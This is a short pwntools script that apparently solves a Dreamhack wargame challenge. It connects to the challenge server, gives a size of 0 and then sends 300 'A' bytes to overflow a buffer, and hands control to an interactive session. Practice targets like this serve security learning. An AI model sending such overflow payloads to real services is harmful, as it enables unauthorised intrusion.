from pwn import *

HOST, PORT = 'host3.dreamhack.games', 8291
r = remote(HOST, PORT)

r.sendlineafter(b'Size: ' , b'0')
r.sendlineafter(b'Data: ', b'A' * 300)

r.interactive()